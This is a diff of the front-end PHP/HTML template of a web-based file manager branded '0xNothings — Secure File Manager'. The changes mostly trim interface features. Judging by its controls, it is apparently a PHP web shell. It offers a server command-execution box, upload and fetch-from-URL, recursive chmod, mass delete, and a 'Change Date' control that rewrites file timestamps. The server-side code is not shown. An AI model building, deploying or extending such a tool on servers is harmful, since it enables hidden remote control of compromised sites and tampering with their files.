         Path: <span class="mono"><?php echo h($current); ?></span>
       </div>
-
-      <!-- Command (dibatasi lebar) -->
       <div class="cmd-container ml-auto">
         <form method="post" action="?a=cmd&p=<?php echo rawurlencode($current); ?>" class="hidden md:flex items-center gap-2 w-full" id="cmdForm">
           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
@@ -920,7 +738,6 @@ $yearNow = date('Y');
   </header>
 
   <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">
-
     <?php if (!empty($_SESSION['cmd_result'])): $cr = $_SESSION['cmd_result']; unset($_SESSION['cmd_result']); ?>
       <section class="col-span-12">
         <div class="card p-4 mb-4">
@@ -935,7 +752,6 @@ $yearNow = date('Y');
       </section>
     <?php endif; ?>
 
-    <!-- SIDEBAR -->
     <aside class="col-span-12 xl:col-span-3 space-y-4">
       <?php if (!empty($_SESSION['msg'])): ?>
         <div class="rounded-xl border border-blue-900/60 bg-blue-900/20 text-blue-100 px-4 py-3">
@@ -963,21 +779,16 @@ $yearNow = date('Y');
         </form>
       </section>
 
-      <!-- CREATE: New File / New Folder -->
       <section class="card p-4">
         <h2 class="font-medium mb-3">Create</h2>
-
         <form method="post" action="?a=new-file&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
           <label class="text-sm text-slate-300">New File</label>
           <input type="text" name="name" class="field mono" placeholder="newfile.txt" required>
-          <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content; jika kosong akan diisi timestamp otomatis"></textarea>
+          <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content"></textarea>
           <button class="btn w-full" type="submit">Create File</button>
-          <div class="text-xs text-slate-400">Dibuat non-0 byte dengan beberapa fallback (lintas versi PHP).</div>
         </form>
-
         <hr class="my-3 border-slate-700">
-
         <form method="post" action="?a=new-dir&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
           <label class="text-sm text-slate-300">New Folder</label>
@@ -993,25 +804,18 @@ $yearNow = date('Y');
             <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
             <input type="file" name="files[]" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
             <button class="btn w-full" type="submit">Upload Files</button>
-            <div class="text-xs text-slate-400">Fallback order: move × rename × copy × get+put × stream copy.</div>
           </form>
           <form method="post" action="?a=url-upload&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
             <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
             <input type="url" name="url" class="field" placeholder="https://example.com/file.txt" required>
             <input type="text" name="filename" class="field" placeholder="File name (optional)">
             <button class="btn w-full" type="submit">Fetch from URL</button>
-            <div class="text-xs text-slate-400">Methods: cURL × copy(stream) × get+put × stream copy.</div>
           </form>
-          <div class="text-xs text-slate-400">
-            Tip: You can also drag &amp; drop files anywhere on this page to upload.
-          </div>
         </div>
       </section>
     </aside>
 
-    <!-- MAIN: Editor / Preview panels + Table -->
     <section class="col-span-12 xl:col-span-9 flex flex-col gap-4">
-
       <?php if ($editFile): ?>
         <?php
           $autoMode = ($viewMode === 'auto');
@@ -1026,37 +830,25 @@ $yearNow = date('Y');
                 <span>Edit File</span>
                 <span class="text-xs text-slate-400">Size: <?php echo h(humanSize((int)@filesize($editFile))); ?></span>
               </div>
-              <div class="flex items-center gap-2">
-                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
-              </div>
+              <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
             </summary>
-
             <div class="mt-3 text-xs text-slate-400 mono line-clamp-2"><?php echo h($editFile); ?></div>
-
             <div class="mt-2">
               <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $viewMode==='txt'?'bg-indigo-600 text-white border-indigo-600':'bg-slate-800'; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($editFile)); ?>&p=<?php echo rawurlencode($current); ?>&mode=txt">Text</a>
               <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $viewMode==='b64'?'bg-indigo-600 text-white border-indigo-600':'bg-slate-800'; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($editFile)); ?>&p=<?php echo rawurlencode($current); ?>&mode=b64">Base64</a>
             </div>
-
             <form method="post" action="?a=edit-save&p=<?php echo rawurlencode($current); ?>" class="mt-3" id="editForm">
               <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
               <input type="hidden" name="file" value="<?php echo h(basename($editFile)); ?>">
               <input type="hidden" name="mode" value="<?php echo h($viewMode); ?>">
-
               <?php if ($viewMode === 'txt'): ?>
                 <textarea id="editor" name="content"><?php echo h($display); ?></textarea>
               <?php else: ?>
                 <textarea name="content" class="w-full h-72 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100" spellcheck="false"><?php echo h($display); ?></textarea>
-                <div class="mt-2 text-xs text-slate-400">Base64 mode: content will be decoded on save.</div>
               <?php endif; ?>
-
               <div class="mt-3 flex flex-wrap gap-2 items-center">
                 <button class="btn btnw" type="submit">Save</button>
-                <button class="btn btnw btn-ghost" type="button" onclick="document.getElementById('editPanel').open=false">Close</button>
-                <a class="btn btnw" href="?p=<?php echo rawurlencode($current); ?>">Exit & Reset</a>
-                <?php if ($viewMode === 'txt'): ?>
-                  <span class="text-xs text-slate-400">Text mode: syntax highlighting auto-detects file type.</span>
-                <?php endif; ?>
+                <a class="btn btnw" href="?p=<?php echo rawurlencode($current); ?>">Exit</a>
               </div>
             </form>
           </details>
@@ -1069,43 +861,22 @@ $yearNow = date('Y');
           $vf_ext  = strtolower(pathinfo($viewFile, PATHINFO_EXTENSION));
           $is_img  = in_array($vf_ext, array('jpg','jpeg','png','gif','webp','bmp','svg'));
           $is_txt  = isTextFile($viewFile);
-          $preview_max = 512 * 1024; // 512KB
-          $txt = '';
-          if ($is_txt) {
-              $txt = @file_get_contents($viewFile, false, null, 0, $preview_max);
-              if ($txt === false) $txt = '';
-          }
+          $preview_max = 512 * 1024;
+          $txt = $is_txt ? (@file_get_contents($viewFile, false, null, 0, $preview_max) ?: '') : '';
         ?>
         <div class="card p-4" id="previewWrap">
           <details id="previewPanel" open>
             <summary class="cursor-pointer font-medium flex items-center justify-between">
-              <div class="flex items-center gap-2">
-                <span>Preview: <span class="mono"><?php echo h(basename($viewFile)); ?></span></span>
-                <span class="text-xs text-slate-400">Size: <?php echo h(humanSize($vf_size)); ?></span>
-              </div>
-              <div class="flex items-center gap-2">
-                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
-              </div>
+              <span>Preview: <span class="mono"><?php echo h(basename($viewFile)); ?></span></span>
+              <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
             </summary>
-
-            <div class="mt-3 text-xs text-slate-400 mono"><?php echo h($viewFile); ?></div>
-
             <div class="mt-3">
               <?php if ($is_img): ?>
-                <img src="?a=raw&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>" alt="preview image" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
+                <img src="?a=raw&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>" alt="preview" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
               <?php elseif ($is_txt): ?>
                 <pre id="previewPre" class="p-3 bg-black/40 rounded-lg overflow-auto text-sm mono border border-slate-700" style="max-height:480px;"><?php echo h($txt); ?></pre>
-                <?php if ($vf_size > $preview_max): ?>
-                  <div class="mt-2 text-xs text-slate-400">Showing <?php echo h(humanSize($preview_max)); ?> of <?php echo h(humanSize($vf_size)); ?>. Use Edit/Download for full content.</div>
-                <?php endif; ?>
               <?php else: ?>
-                <div class="rounded-lg border border-slate-700 p-3 bg-slate-900/50">
-                  <div class="text-sm">This file type cannot be previewed directly.</div>
-                  <div class="mt-2 flex gap-2">
-                    <a class="btn btn-sm btnw" href="?a=download&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>">Download</a>
-                    <a class="btn btn-sm btnw" href="?a=edit&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>">Edit (careful if binary)</a>
-                  </div>
-                </div>
+                <a class="btn btn-sm btnw" href="?a=download&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>">Download</a>
               <?php endif; ?>
             </div>
           </details>
@@ -1120,24 +891,10 @@ $yearNow = date('Y');
         <form method="post" action="?a=mass-delete&p=<?php echo rawurlencode($current); ?>" class="flex-1 flex flex-col" id="bulkDeleteForm">
           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
           <div class="mb-3 flex flex-wrap gap-2">
-            <button class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete all selected items?')">Delete Selected</button>
+            <button class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete selected?')">Delete Selected</button>
             <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(true)">Select All</button>
             <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(false)">Select None</button>
-
-            <div class="hidden md:flex items-center gap-2 ml-auto text-xs text-slate-400">
-              <span>Sort:</span>
-              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('name')">Name</button>
-              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('size')">Size</button>
-              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('mtime')">Modified</button>
-            </div>
-
-            <!-- Toggle drag-to-move (default OFF) -->
-            <label class="flex items-center gap-2 text-xs text-slate-300 ml-2">
-              <input id="dragToggle" type="checkbox" class="accent-indigo-500">
-              Enable drag-to-move
-            </label>
           </div>
-
           <div class="tablewrap overflow-x-auto rounded-xl border border-slate-700 flex-1" id="dropZone">
             <table id="dirTable" class="tbl min-w-full text-sm">
               <thead class="text-left border-b border-slate-700">
@@ -1155,24 +912,12 @@ $yearNow = date('Y');
                       $r = @is_readable($full); $w = @is_writable($full);
                       $permColorClass = $w ? 'text-lime-400' : ($r ? 'text-white' : 'text-red-400');
                 ?>
-                  <tr class="border-b border-slate-800 hoverable"
-                      data-type="dir"
-                      data-name="<?php echo h(strtolower($name)); ?>"
-                      data-size="0"
-                      data-mtime="<?php echo (int)@filemtime($full); ?>"
-                      draggable="true"
-                      ondragstart="onDragStartItem(event, <?php echo je($name); ?>)"
-                      ondragover="onDragOverDir(event)"
-                      ondragleave="onDragLeaveDir(event)"
-                      ondrop="onDropToDir(event, <?php echo je($name); ?>)">
+                  <tr class="border-b border-slate-800 hoverable" data-name="<?php echo h(strtolower($name)); ?>">
                     <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                     <td class="py-2 px-2">
                       <div class="flex items-center gap-2 <?php echo $permColorClass; ?>">
                         <?php echo iconSvgFor($full); ?>
-                        <a class="hover:underline font-medium text-white"
-                           draggable="false"
-                           onclick="return guardLinkCopy(event)"
-                           href="?p=<?php echo rawurlencode($full); ?>"><?php echo h($name); ?></a>
+                        <a class="hover:underline font-medium text-white" href="?p=<?php echo rawurlencode($full); ?>"><?php echo h($name); ?></a>
                         <span class="badge-small">DIR</span>
                       </div>
                     </td>
@@ -1183,28 +928,23 @@ $yearNow = date('Y');
                       <div class="row-actions">
                         <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Edit</span>
                         <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Download</span>
-
                         <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($name); ?>')">Rename</button>
                         <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($name); ?>')">Chmod</button>
                         <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($name); ?>')">Change Date</button>
-
-                        <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" onsubmit="return confirm('Delete this directory (recursive)?')" class="inline">
+                        <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" onsubmit="return confirm('Delete?')" class="inline">
                           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                           <input type="hidden" name="target" value="<?php echo h($name); ?>">
                           <button class="btn btn-xs btnw" type="submit">Delete</button>
                         </form>
                       </div>
-
                       <div id="rn-<?php echo h($name); ?>" class="hidden mt-2">
                         <form method="post" action="?a=rename&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2">
                           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                           <input type="hidden" name="old" value="<?php echo h($name); ?>">
                           <input type="text" name="new" class="field w-48" placeholder="New name">
                           <button class="btn btn-sm btnw" type="submit">OK</button>
-                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                         </form>
                       </div>
-
                       <div id="cm-<?php echo h($name); ?>" class="hidden mt-2">
                         <form method="post" action="?a=chmod&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
@@ -1212,18 +952,14 @@ $yearNow = date('Y');
                           <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
                           <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                           <button class="btn btn-sm btnw" type="submit">OK</button>
-                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                         </form>
                       </div>
-
                       <div id="mt-<?php echo h($name); ?>" class="hidden mt-2">
                         <form method="post" action="?a=mtime&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                           <input type="hidden" name="target" value="<?php echo h($name); ?>">
-                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
-                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive" checked> recursive</label>
+                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS" required>
                           <button class="btn btn-sm btnw" type="submit">OK</button>
-                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                         </form>
                       </div>
                     </td>
@@ -1234,23 +970,12 @@ $yearNow = date('Y');
                       $r = @is_readable($full); $w = @is_writable($full);
                       $permColorClass = $w ? 'text-lime-400' : ($r ? 'text-white' : 'text-red-400');
                 ?>
-                  <tr class="border-b border-slate-800 hoverable"
-                      data-type="file"
-                      data-name="<?php echo h(strtolower($name)); ?>"
-                      data-size="<?php echo $size; ?>"
-                      data-mtime="<?php echo $mtime; ?>"
-                      draggable="true"
-                      ondragstart="onDragStartItem(event, <?php echo je($name); ?>)">
+                  <tr class="border-b border-slate-800 hoverable" data-name="<?php echo h(strtolower($name)); ?>">
                     <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                     <td class="py-2 px-2">
                       <div class="flex items-center gap-2 <?php echo $permColorClass; ?>">
                         <?php echo iconSvgFor($full); ?>
-                        <a class="font-medium hover:underline text-white"
-                           draggable="false"
-                           onclick="return guardLinkCopy(event)"
-                           href="?a=view&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">
-                          <?php echo h($name); ?>
-                        </a>
+                        <a class="font-medium hover:underline text-white" href="?a=view&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>"><?php echo h($name); ?></a>
                       </div>
                     </td>
                     <td class="py-2 px-2 mono"><?php echo h(humanSize($size)); ?></td>
@@ -1260,520 +985,73 @@ $yearNow = date('Y');
                       <div class="row-actions">
                         <a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Edit</a>
                         <a class="btn btn-xs btnw" href="?a=download&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Download</a>
-
                         <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($name); ?>')">Rename</button>
                         <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($name); ?>')">Chmod</button>
                         <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($name); ?>')">Change Date</button>
-
-                        <?php if (in_array($ext,array('zip')) || preg_match('~\.(tar|tar\.gz|tar\.bz2|tar\.xz)$~i', $name)): ?>
+                        <?php if ($ext==='zip' || preg_match('~\.(tar|tar\.gz|tar\.bz2|tar\.xz)$~i', $name)): ?>
                           <form method="post" action="?a=unzip&p=<?php echo rawurlencode($current); ?>" class="inline">
                             <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                             <input type="hidden" name="file" value="<?php echo h($name); ?>">
-                            <button class="btn btn-xs btnw" type="submit">Unzip here</button>
+                            <button class="btn btn-xs btnw" type="submit">Unzip</button>
                           </form>
                         <?php endif; ?>
-
-                        <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" class="inline" onsubmit="return confirm('Delete this file?')">
+                        <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" class="inline" onsubmit="return confirm('Delete?')">
                           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                           <input type="hidden" name="target" value="<?php echo h($name); ?>">
                           <button class="btn btn-xs btnw" type="submit">Delete</button>
                         </form>
                       </div>
-
                       <div id="rn-<?php echo h($name); ?>" class="hidden mt-2">
                         <form method="post" action="?a=rename&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 mt-1">
                           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                           <input type="hidden" name="old" value="<?php echo h($name); ?>">
                           <input type="text" name="new" class="field w-48" placeholder="New name">
                           <button class="btn btn-sm btnw" type="submit">OK</button>
-                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                         </form>
                       </div>
-
                       <div id="cm-<?php echo h($name); ?>" class="hidden mt-2">
                         <form method="post" action="?a=chmod&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center mt-1">
                           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                           <input type="hidden" name="target" value="<?php echo h($name); ?>">
                           <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
-                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                           <button class="btn btn-sm btnw" type="submit">OK</button>
-                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                         </form>
                       </div>
-
                       <div id="mt-<?php echo h($name); ?>" class="hidden mt-2">
                         <form method="post" action="?a=mtime&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                           <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                           <input type="hidden" name="target" value="<?php echo h($name); ?>">
-                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
-                          <label class="text-xs flex items-center gap-1 opacity-50"><input type="checkbox" disabled> recursive</label>
+                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS" required>
                           <button class="btn btn-sm btnw" type="submit">OK</button>
-                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                         </form>
                       </div>
-
                     </td>
                   </tr>
                 <?php endforeach; ?>
-
-                <?php if (empty($dirs) && empty($files)): ?>
-                  <tr><td colspan="6" class="py-6 text-center text-slate-400">Empty</td></tr>
-                <?php endif; ?>
-
               </tbody>
             </table>
-          </div>
-          <!-- below the table -->
-          <div class="mt-3">
-            <form method="post"
-                  action="?a=zip&p=<?php echo rawurlencode($current); ?>"
-                  class="inline-flex flex-wrap gap-2 items-center">
-              <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
-              <input type="text" name="zipname" class="field w-56" placeholder="archive-name.zip (optional)">
-              <button class="btn btn-sm btnw" type="submit" onclick="return collectSelectedInto(this.form)">Zip Selected</button>
-              <span class="text-xs text-slate-400">
-                If ZipArchive is unavailable, a <span class="mono">.tar</span> will be created (no compression).
-              </span>
-            </form>
           </div>
         </form>
       </div>
     </section>
   </main>
-
-  <!-- Footer -->
   <footer class="w-full px-6 py-4">
     <div class="footer-line mb-3"></div>
     <div class="text-xs text-slate-400 flex items-center justify-between">
-      <span>© <?php echo $yearNow; ?> 0xNothings — Secure File Manager. All rights reserved.</span>
+      <span>© <?php echo $yearNow; ?> 0xNothings — Secure File Manager</span>
       <span>Built with ❤️ & Tailwind x Dark UI</span>
     </div>
   </footer>
-
   <script>
-    document.documentElement.classList.add('dark');
-
-    // Jangan navigasi ketika ada teks terseleksi (agar <a> gampang di-copy)
-    function guardLinkCopy(e){
-      var sel = '';
-      if (window.getSelection) sel = String(window.getSelection());
-      if (sel && sel.length > 0){
-        e.preventDefault();
-        return false;
-      }
-      return true;
-    }
-
-    // Search filter
-    const searchEl = document.getElementById('searchBox');
     function filterRows(){
-      const q = (searchEl && searchEl.value || '').trim().toLowerCase();
-      const rows = document.querySelectorAll('#dirBody tr');
-      rows.forEach(function(r){
-        var name = r.getAttribute('data-name')||'';
-        r.style.display = name.indexOf(q) !== -1 ? '' : 'none';
+      const q = (document.getElementById('searchBox').value || '').toLowerCase();
+      document.querySelectorAll('#dirBody tr').forEach(r => {
+        r.style.display = (r.getAttribute('data-name')||'').includes(q) ? '' : 'none';
       });
     }
-    window.addEventListener('keydown', function(e){ if(e.ctrlKey && e.key === '/'){ e.preventDefault(); if(searchEl){searchEl.focus();} } });
-    
-
-    // Sort
-    var sortState = { key:'name', asc:true };
-    function sortBy(key){
-      var body = document.getElementById('dirBody');
-      var rows = Array.prototype.slice.call(body.querySelectorAll('tr'));
-      var factor = (sortState.key===key && sortState.asc)?-1:1;
-      sortState = { key: key, asc: factor===1 };
-      rows.sort(function(a,b){
-        if(key==='name'){ return a.dataset.name.localeCompare(b.dataset.name) * factor; }
-        if(key==='size' || key==='mtime'){
-          var av = parseInt(a.dataset[key]||'0',10);
-          var bv = parseInt(b.dataset[key]||'0',10);
-          return (av-bv) * factor;
-        }
-        return 0;
-      });
-      rows.forEach(function(r){ body.appendChild(r); });
-    }
-
-    // Checkboxes
-    function toggleAll(master){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = master.checked; }); }
-    function selectAll(flag){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = !!flag; }); var m=document.getElementById('chkAll'); if(m) m.checked=!!flag; }
-    function toggleRow(id){ var el=document.getElementById(id); if(el) el.classList.toggle('hidden'); }
-    function closeAction(btn){ var holder = btn.closest('div[id^="rn-"], div[id^="cm-"], div[id^="mt-"]'); if(holder) holder.classList.add('hidden'); }
-
-    // Collect selected items for Zip form
-    function collectSelectedInto(form){
-      Array.prototype.forEach.call(form.querySelectorAll('input[name="items[]"]'), function(n){ n.parentNode.removeChild(n); });
-      Array.prototype.forEach.call(document.querySelectorAll('#dirBody .rowchk:checked'), function(chk){
-        var i = document.createElement('input');
-        i.type='hidden'; i.name='items[]'; i.value=chk.value;
-        form.appendChild(i);
-      });
-      return true;
-    }
-
-    // ===== Drag & Drop Upload =====
-    var dropZone = document.getElementById('dropZone');
-    var tableCard = document.getElementById('tableCard');
-    var csrf = <?php echo je($csrf); ?>;
-    var currentPath = <?php echo je($current); ?>;
-
-    ['dragenter','dragover'].forEach(function(ev){
-      document.addEventListener(ev, function(e){ e.preventDefault(); e.stopPropagation(); tableCard.classList.add('drop-hint'); });
-    });
-    ['dragleave','drop'].forEach(function(ev){
-      document.addEventListener(ev, function(e){
-        if(ev==='dragleave' && e.target !== document) return;
-        tableCard.classList.remove('drop-hint');
-      });
-    });
-    document.addEventListener('drop', function(e){
-      if(!e.dataTransfer || !e.dataTransfer.files || e.dataTransfer.files.length===0) return;
-      e.preventDefault(); e.stopPropagation();
-      try{
-        var fd = new FormData();
-        fd.append('csrf', csrf);
-        for(var i=0;i<e.dataTransfer.files.length;i++){ var f=e.dataTransfer.files[i]; fd.append('files[]', f, f.name); }
-        fetch('?a=upload&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
-          .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
-          .catch(function(){ alert('Upload failed'); });
-      }catch(err){ console.error(err); alert('Upload failed'); }
-    });
-
-    // ===== Drag to Move between directories (copy-friendly by default) =====
-    var draggedItemName = null;
-    var dragEnabled = false; // DEFAULT OFF → tabel mudah di-copy
-
-    // Toggle handler
-    (function(){
-      var dt = document.getElementById('dragToggle');
-      if (dt) {
-        dragEnabled = !!dt.checked;
-        dt.addEventListener('change', function(){
-          dragEnabled = !!dt.checked;
-        });
-      }
-    })();
-
-    function onDragStartItem(ev, name){
-      if (!dragEnabled) {
-        ev.preventDefault();
-        return false;
-      }
-      draggedItemName = name; ev.dataTransfer.setData('text/plain', name);
-      ev.dataTransfer.effectAllowed = 'move';
-    }
-    function onDragOverDir(ev){
-      if (!dragEnabled) return;
-      ev.preventDefault(); ev.currentTarget.classList.add('droptarget');
-      ev.dataTransfer.dropEffect = 'move';
-    }
-    function onDragLeaveDir(ev){
-      ev.currentTarget.classList.remove('droptarget');
-    }
-    function onDropToDir(ev, dirName){
-      if (!dragEnabled) return;
-      ev.preventDefault();
-      var row = ev.currentTarget; row.classList.remove('droptarget');
-      var src = draggedItemName || ev.dataTransfer.getData('text/plain');
-      if(!src) return;
-      try{
-        var fd = new FormData();
-        fd.append('csrf', csrf);
-        fd.append('src', src);
-        var dstAbs = <?php echo je($current.DIRECTORY_SEPARATOR); ?> + dirName;
-        fd.append('dst', dstAbs);
-        fetch('?a=move&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
-          .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
-          .catch(function(){ alert('Move failed'); });
-      }catch(err){ console.error(err); alert('Move failed'); }
-    }
-
-    // ===== CodeMirror Init (file editor text mode) =====
-    <?php if ($editFile && $viewMode === 'txt'): ?>
-    (function(){
-      var ta = document.getElementById('editor'); if (!ta) return;
-      var filename = <?php echo je(basename($editFile)); ?>;
-      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
-      var info = CodeMirror.findModeByFileName(filename) || CodeMirror.findModeByMIME('text/plain');
-      var cm = CodeMirror.fromTextArea(ta, {
-        lineNumbers:true, styleActiveLine:true, matchBrackets:true, autoCloseBrackets:true,
-        lineWrapping:true, theme:'material-darker',
-        mode: (info && info.mime) ? info.mime : 'text/plain',
-        viewportMargin: Infinity
-      });
-      if (info && info.mode) { CodeMirror.autoLoadMode(cm, info.mode); }
-      var det = document.getElementById('editPanel'); if(det){ det.addEventListener('toggle', function(){ setTimeout(function(){cm.refresh();},50); }); }
-      var form = document.getElementById('editForm'); if(form){ form.addEventListener('submit', function(){ cm.save(); }); }
-    })();
-    <?php endif; ?>
-
-    // ===== CodeMirror untuk PREVIEW (readonly, auto-detect) =====
-    (function(){
-      var pre = document.getElementById('previewPre');
-      if(!pre || typeof CodeMirror === 'undefined') return;
-
-      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
-      var filename = <?php echo je($viewFile ? basename($viewFile) : ''); ?>;
-      var info = (filename && CodeMirror.findModeByFileName(filename)) || CodeMirror.findModeByMIME('text/plain');
-
-      var textValue = pre.textContent || '';
-      var holder = document.createElement('div');
-      pre.parentNode.replaceChild(holder, pre);
-
-      var cmPrev = CodeMirror(holder, {
-        value: textValue,
-        readOnly: true,
-        lineNumbers: true,
-        lineWrapping: true,
-        theme: 'material-darker',
-        mode: (info && info.mime) ? info.mime : 'text/plain',
-        viewportMargin: Infinity
-      });
-
-      if (info && info.mode) CodeMirror.autoLoadMode(cmPrev, info.mode);
-      cmPrev.setSize('100%', 480);
-
-      var det = document.getElementById('previewPanel');
-      if (det) det.addEventListener('toggle', function(){ setTimeout(function(){ cmPrev.refresh(); }, 50); });
-      window.addEventListener('resize', function(){ cmPrev.refresh(); });
-    })();
-
-    // ===== CodeMirror untuk RUN COMMAND (single-line + placeholder) =====
-    (function(){
-      var ta = document.getElementById('cmdTA');
-      if(!ta || typeof CodeMirror === 'undefined') return;
-
-      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
-      var isWin = <?php echo je(DIRECTORY_SEPARATOR === '\\'); ?>;
-      var cmdMode = isWin ? 'powershell' : 'shell';
-
-      var cmCmd = CodeMirror.fromTextArea(ta, {
-        lineNumbers: false,
-        styleActiveLine: true,
-        matchBrackets: true,
-        autoCloseBrackets: true,
-        lineWrapping: false,
-        theme: 'material-darker',
-        mode: cmdMode,
-        viewportMargin: Infinity,
-        placeholder: 'Run Command'
-      });
-
-      CodeMirror.autoLoadMode(cmCmd, cmdMode);
-      cmCmd.setSize('100%', 36);
-      cmCmd.getWrapperElement().classList.add('cm-cmd-input');
-
-      cmCmd.on('beforeChange', function(cm, change){
-        var hasNewline = change.text && (change.text.length > 1 || /\r|\n/.test(change.text[0]));
-        if (hasNewline) change.update(change.from, change.to, [' ']);
-      });
-
-      cmCmd.on('keydown', function(cm, e){
-        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
-          e.preventDefault();
-          var form = document.getElementById('cmdForm');
-          if (form) form.submit();
-        }
-      });
-
-      var form = document.getElementById('cmdForm');
